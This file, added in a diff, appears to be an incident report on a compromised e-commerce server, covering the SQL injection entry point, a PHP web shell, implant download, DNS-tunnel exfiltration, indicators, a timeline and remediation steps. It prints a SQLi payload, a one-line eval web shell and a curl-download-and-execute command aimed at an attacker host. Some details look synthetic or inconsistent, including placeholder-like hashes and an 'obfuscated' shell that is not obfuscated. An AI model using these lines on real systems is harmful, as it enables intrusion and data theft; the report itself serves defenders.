@@ -1,0 +1,92 @@
+INCIDENT REPORT — Web Application Compromise
+Severity: Critical
+Date: 2026-05-30
+TLP: RED
+
+SUMMARY
+=======
+A public-facing e-commerce application was compromised via a SQL injection
+vulnerability in the product search endpoint. The attacker exfiltrated the
+customer database and installed a PHP web shell for persistent access.
+
+INITIAL ACCESS
+==============
+The attacker exploited an unauthenticated SQL injection vulnerability
+(CVE-2025-38821) in the /api/v2/search endpoint. Payload observed in logs:
+
+  GET /api/v2/search?q=shoes'+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--
+
+Error-based SQLi was used to enumerate the database schema. No authentication
+was required. The application was running PHP 7.4 on Apache/2.4.54.
+
+PERSISTENCE — WEB SHELL
+========================
+Following initial access, the attacker wrote a web shell to the server:
+
+  Path: /var/www/html/assets/img/thumb_cache.php
+  SHA256: 4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b
+  MD5:   8277e0910d750195b448797616e091ad
+
+Web shell content (obfuscated):
+  <?php eval(base64_decode($_POST['cmd'])); ?>
+
+POST requests to thumb_cache.php were observed from:
+  - 91.108.4.22 (Telegram CDN IP — possible proxy)
+  - 5.188.86.172 (AS49505 - known bulletproof hosting)
+  - 185.234.219.32
+
+C2 COMMUNICATION
+================
+The web shell was used to download a secondary implant:
+
+  curl http://malicious-updates.net/wp-content/uploads/patch.elf -o /tmp/.sysupd
+  chmod +x /tmp/.sysupd && /tmp/.sysupd
+
+The implant established outbound HTTPS connections to:
+  - update.malicious-updates.net:443
+  - cdn.securestat-check.io:443
+
+Beacon interval: approximately 60 seconds.
+
+DATA EXFILTRATION
+=================
+The attacker used the SQL injection to dump the customers table directly
+via outbound DNS queries (DNS tunneling):
+
+  Tool: iodine (observed in /proc/<pid>/cmdline)
+  DNS resolver used: 185.234.219.32 (same as C2 above)
+  Tunnel domain: data.exfil-dns.top
+  Estimated records exfiltrated: ~140,000 customer rows (name, email, hashed password)
+
+Email addresses observed in DNS query logs (sample):
+  - admin@malicious-updates.net
+  - dropper@exfil-dns.top
+
+FILE ARTIFACTS
+==============
+  /tmp/.sysupd           SHA1:   a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
+  /tmp/iodine            MD5:    eccbc87e4b5ce2fe28308fd9f2a7baf3
+  /var/log/apache2/exfil.log (deleted — recreate from journal)
+
+AFFECTED HOST
+=============
+  Host: web-prod-01.internal (10.0.1.15 — internal, do not block)
+  OS: Ubuntu 22.04 LTS
+  Exposure: public internet (0.0.0.0:443)
+
+TIMELINE
+========
+  2026-05-28 02:14 UTC  First SQLi attempt observed
+  2026-05-28 02:31 UTC  Web shell written
+  2026-05-28 03:05 UTC  Secondary implant downloaded
+  2026-05-29 14:22 UTC  DNS exfiltration traffic detected by network sensor
+  2026-05-30 09:00 UTC  IR engagement begins
+
+RECOMMENDATIONS
+===============
+- Patch CVE-2025-38821 immediately; apply WAF rule in the interim
+- Block the three attacker IPs at perimeter
+- Sinkhole or DNS-block exfil-dns.top and malicious-updates.net
+- Rotate all credentials stored in the affected database
+- Notify affected customers per applicable breach notification laws
+- Check all other public endpoints for similar SQLi patterns
